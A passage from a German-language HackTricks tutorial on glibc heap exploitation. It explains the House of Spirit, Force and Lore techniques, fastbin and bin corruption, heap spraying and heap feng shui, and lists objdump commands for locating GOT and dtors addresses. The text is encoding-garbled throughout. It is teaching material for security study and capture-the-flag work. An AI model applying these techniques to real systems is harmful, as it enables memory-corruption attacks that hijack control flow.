Au√üerdem muss der Chunk, der neben dem freigegebenen Chunk liegt, gr√∂√üer als 8 sein. Da wir gesagt haben, dass die Gr√∂√üe des freigegebenen Chunks 8 betr√§gt, m√ºssen wir in diesem falschen Chunk nur eine Gr√∂√üe gr√∂√üer als 8 setzen (da die Shellcode im freigegebenen Chunk stehen wird, muss am Anfang ein jmp stehen, der auf nops zeigt).

Au√üerdem muss dieser falsche Chunk kleiner sein als av->system\_mem. av->system\_mem liegt 1848 Bytes weiter oben.

Aufgrund der Nullen von \_DTOR\_END\_ und der wenigen Adressen in der GOT sind keine dieser Adressen geeignet, um √ºberschrieben zu werden. Schauen wir uns also an, wie wir Fastbin anwenden k√∂nnen, um den Stack anzugreifen.

Eine andere M√∂glichkeit des Angriffs besteht darin, das **av** auf den Stack umzuleiten.

Wenn wir die Gr√∂√üe so √§ndern, dass sie 16 statt 8 betr√§gt, gibt uns fastbin\_index() fastbins\[0\] zur√ºck und wir k√∂nnen dies nutzen, um den Stack zu √ºberschreiben.

Daf√ºr darf auf dem Stack kein Canary oder seltsame Werte vorhanden sein, tats√§chlich m√ºssen wir uns in folgendem Zustand befinden: 4 Nullbytes + EBP + RET

Die 4 Nullbytes werden ben√∂tigt, damit **av** auf diese Adresse zeigt und das erste Element eines **av** ist das Mutex, das den Wert 0 haben muss.

**av->max\_fast** wird EBP sein und ein Wert, der uns helfen wird, die Restriktionen zu umgehen.

In **av->fastbins\[0\]** wird die Adresse von **p** √ºberschrieben und wird RET sein, so dass zur Shellcode gesprungen wird.

Au√üerdem gibt es in **av->system\_mem** (1484 Bytes √ºber der Position auf dem Stack) viel M√ºll, der es uns erm√∂glicht, die √úberpr√ºfung zu umgehen.

Au√üerdem muss der Chunk, der neben dem freigegebenen Chunk liegt, gr√∂√üer als 8 sein. Da wir gesagt haben, dass die Gr√∂√üe des freigegebenen Chunks 16 betr√§gt, m√ºssen wir in diesem falschen Chunk nur eine Gr√∂√üe gr√∂√üer als 8 setzen (da die Shellcode im freigegebenen Chunk stehen wird, muss am Anfang ein jmp stehen, der auf die nops zeigt, die nach dem size-Feld des neuen falschen Chunks kommen).

**The House of Spirit**

In diesem Fall m√∂chten wir einen Zeiger auf ein malloc haben, der vom Angreifer ver√§nderbar ist (z. B. ein Zeiger auf dem Stack unter einem m√∂glichen Overflow einer Variablen).

Auf diese Weise k√∂nnten wir diesen Zeiger auf eine beliebige Adresse zeigen lassen. Allerdings ist nicht jede Adresse g√ºltig, die Gr√∂√üe des gef√§lschten Chunks muss kleiner als av->max\_fast und genauer gesagt gleich der Gr√∂√üe sein, die bei einem zuk√ºnftigen Aufruf von malloc()+8 angefordert wird. Daher, wenn wir wissen, dass nach diesem anf√§lligen Zeiger ein malloc(40) aufgerufen wird, muss die Gr√∂√üe des gef√§lschten Chunks 48 betragen.

Wenn zum Beispiel das Programm den Benutzer nach einer Zahl fragt, k√∂nnten wir 48 eingeben und den ver√§nderbaren malloc-Zeiger auf die n√§chsten 4 Bytes zeigen lassen (die m√∂glicherweise zum EBP geh√∂ren, so dass die 48 dahinter liegt, als ob es die Gr√∂√üenangabe w√§re). Au√üerdem m√ºssen die Adresse ptr-4+48 mehrere Bedingungen erf√ºllen (wobei in diesem Fall ptr=EBP), d. h. 8 < ptr-4+48 < av->system\_mem.

Wenn dies erf√ºllt ist, wird beim n√§chsten malloc, von dem wir gesagt haben, dass es malloc(40) ist, die Adresse des EBP als Adresse zugewiesen. Wenn der Angreifer auch kontrollieren kann, was in diesem malloc geschrieben wird, kann er sowohl den EBP als auch den EIP mit der gew√ºnschten Adresse √ºberschreiben.

Ich glaube, das liegt daran, dass, wenn es freigegeben wird, free() speichert, dass an der Adresse, auf die der EBP des Stacks zeigt, ein Chunk mit der perfekten Gr√∂√üe f√ºr das neue malloc() reserviert werden soll, und weist ihm diese Adresse zu.

**The House of Force**

Es wird ben√∂tigt:

* Ein Overflow zu einem Chunk, der es erm√∂glicht, das Wilderness zu √ºberschreiben.
* Ein Aufruf von malloc() mit der vom Benutzer definierten Gr√∂√üe.
* Ein Aufruf von malloc(), dessen Daten vom Benutzer definiert werden k√∂nnen.

Zuerst wird die Gr√∂√üe des Wilderness-Chunks mit einem sehr gro√üen Wert (0xffffffff) √ºberschrieben, so dass jede ausreichend gro√üe Speicheranforderung in \_int\_malloc() behandelt wird, ohne den Heap erweitern zu m√ºssen.

Zweitens wird av->top so ge√§ndert, dass es auf einen vom Angreifer kontrollierten Speicherbereich zeigt, wie z. B. den Stack. In av->top wird \&EIP - 8 gespeichert.

Wir m√ºssen av->top √ºberschreiben, damit es auf den vom Angreifer kontrollierten Speicherbereich zeigt:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim erh√§lt den Wert der Adresse des aktuellen Wilderness-Chunks (der aktuelle av->top) und remainder ist genau die Summe dieser Adresse plus der Anzahl der Bytes, die von malloc() angefordert wurden. Wenn also \&EIP-8 bei 0xbffff224 liegt und av->top den Wert 0x080c2788 enth√§lt, dann ist die Menge, die wir in dem kontrollierten malloc reservieren m√ºssen, damit av->top auf $EIP-8 f√ºr das n√§chste malloc() zeigt:

0xbffff224 - 0x080c2788 = 3086207644.

Auf diese Weise wird der ge√§nderte Wert in av->top gespeichert und das n√§chste malloc zeigt auf EIP und kann es √ºberschreiben.

Es ist wichtig zu wissen, dass die Gr√∂√üe des neuen Wilderness-Chunks gr√∂√üer sein muss als die Anforderung des letzten malloc(). Das hei√üt, wenn das Wilderness auf \&EIP-8 zeigt, wird die Gr√∂√üe genau im EBP-Feld des Stacks stehen.

**The House of Lore**

**SmallBin-Korruption**

Die freigegebenen Chunks werden je nach ihrer Gr√∂√üe in den Bin eingef√ºgt. Bevor sie jedoch eingef√ºgt werden, werden sie in unsorted bins gespeichert. Ein freigegebener Chunk wird nicht sofort in seinen Bin eingef√ºgt, sondern bleibt in unsorted bins. Wenn dann ein neuer Chunk reserviert wird und der zuvor freigegebene Chunk verwendet werden kann, wird er zur√ºckgegeben. Wenn jedoch ein gr√∂√üerer Chunk reserviert wird, wird der freigegebene Chunk in seinen entsprechenden Bin eingef√ºgt.

Um den verwundbaren Code zu erreichen, muss die Speicheranforderung gr√∂√üer als av->max\_fast (normalerweise 72) und kleiner als MIN\_LARGE\_SIZE (512) sein.

Wenn im Bin ein Chunk mit der richtigen Gr√∂√üe vorhanden ist,
Reservieren Sie zwei mallocs, so dass der erste nach dem Freigeben des zweiten und Einf√ºgen in seinen Bin (dh nachdem ein malloc gr√∂√üer als der zweite Chunk reserviert wurde) √ºberlaufen werden kann.

Der vom Angreifer gew√§hlte Speicherbereich sollte von ihm kontrolliert werden.

Das Ziel ist folgendes: Wenn wir einen Heap-Overflow auf einen bereits freigegebenen Chunk ausl√∂sen k√∂nnen, k√∂nnen wir seinen bk-Zeiger √§ndern. Wenn wir den bk-Zeiger √§ndern und dieser Chunk der erste in der Bin-Liste ist und reserviert wird, wird die Bin-Liste get√§uscht und glaubt, dass der n√§chste Chunk in der gef√§lschten Adresse liegt, die wir angegeben haben (zum Beispiel im Stack oder in der GOT). Wenn also ein weiterer Chunk reserviert wird und der Angreifer darauf zugreifen kann, wird ihm ein Chunk an der gew√ºnschten Position gegeben und er kann darauf schreiben.

Nachdem der modifizierte Chunk freigegeben wurde, muss ein gr√∂√üerer Chunk reserviert werden, damit der modifizierte Chunk aus den unsortierten Bins entfernt und in seinen Bin eingef√ºgt wird.

Sobald er in seinem Bin ist, ist es an der Zeit, den bk-Zeiger durch den Overflow zu √§ndern, damit er auf die gew√ºnschte Adresse zeigt.

Der Bin muss dann warten, bis malloc() ausreichend oft aufgerufen wird, um den modifizierten Bin erneut zu verwenden und den Bin zu t√§uschen, indem er glaubt, dass der n√§chste Chunk an der gef√§lschten Adresse liegt. Dann wird der gew√ºnschte Chunk bereitgestellt.

Um die Schwachstelle so schnell wie m√∂glich auszunutzen, w√§re ideal: Reservierung des anf√§lligen Chunks, Reservierung des Chunks, der modifiziert wird, Freigabe dieses Chunks, Reservierung eines gr√∂√üeren Chunks als der zu modifizierende, Modifizierung des Chunks (Schwachstelle), Reservierung eines Chunks mit der gleichen Gr√∂√üe wie der verwundbare Chunk und Reservierung eines zweiten Chunks mit der gleichen Gr√∂√üe, der auf die gew√§hlte Adresse zeigt.

Um diesen Angriff zu sch√ºtzen, wird die √ºbliche √úberpr√ºfung verwendet, dass der Chunk "nicht" gef√§lscht ist: Es wird √ºberpr√ºft, ob bck->fd auf victim zeigt. In unserem Fall bedeutet das, dass der fd-Zeiger des gef√§lschten Chunks im Stack auf victim zeigt. Um diesen Schutz zu umgehen, m√ºsste der Angreifer in der Lage sein, auf irgendeine Weise (wahrscheinlich √ºber den Stack) die Adresse von victim an der richtigen Stelle zu schreiben. Damit sieht es wie ein echter Chunk aus.

**LargeBin-Korruption**

Die gleichen Voraussetzungen wie zuvor sind erforderlich, und die reservierten Chunks m√ºssen gr√∂√üer als 512 sein.

Der Angriff ist √§hnlich wie zuvor, dh der bk-Zeiger muss ge√§ndert werden und all diese malloc()-Aufrufe sind erforderlich, aber zus√§tzlich muss die Gr√∂√üe des modifizierten Chunks so ge√§ndert werden, dass size - nb < MINSIZE ist.

Zum Beispiel wird size auf 1552 gesetzt, damit 1552 - 1544 = 8 < MINSIZE (die Subtraktion kann nicht negativ sein, da ein unsigned Wert verglichen wird).

Dar√ºber hinaus wurde ein Patch eingef√ºhrt, um es noch schwieriger zu machen.

**Heap Spraying**

Dies besteht im Wesentlichen darin, so viel Speicher wie m√∂glich f√ºr Heaps zu reservieren und diese mit einer NOP-Schl√ºsselzeichenfolge gefolgt von einer Shellcode zu f√ºllen. Als Schl√ºsselzeichenfolge wird 0x0c verwendet. Es wird versucht, zur Adresse 0x0c0c0c0c zu springen, und wenn eine Adresse mit dieser Schl√ºsselzeichenfolge √ºberschrieben wird und dorthin gesprungen wird, wird der Code ausgef√ºhrt. Die Taktik besteht im Wesentlichen darin, so viel wie m√∂glich zu reservieren, um zu sehen, ob ein Zeiger √ºberschrieben wird, und dann zu 0x0c0c0c0c zu springen, in der Hoffnung, dass dort NOPs vorhanden sind.

**Heap Feng Shui**

Dies besteht darin, durch Reservierungen und Freigaben den Speicher so zu strukturieren, dass reservierte Chunks zwischen freien Chunks verbleiben. Der zu √ºberlaufende Puffer wird in einem dieser L√ºcken platziert.

**objdump -d ausf√ºhrbare Datei** ‚Äî> Disassemblierung von Funktionen\
**objdump -d ./PROGRAMM | grep FUNKTION** ‚Äî> Adresse der Funktion erhalten\
**objdump -d -Mintel ./shellcodeout** ‚Äî> √úberpr√ºfen, ob es sich tats√§chlich um unseren Shellcode handelt, und die OpCodes anzeigen\
**objdump -t ./exec | grep varBss** ‚Äî> Symboltabelle, um Adressen von Variablen und Funktionen zu erhalten\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Adressen von Bibliotheksfunktionen erhalten (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Adresse von puts erhalten, die in der GOT √ºberschrieben werden soll\
**objdump -D ./exec** ‚Äî> Disassemblierung ALL bis zu den Eintr√§gen der plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Informationen zur Funktion in gdb

## Interessante Kurse

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **Referenzen**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
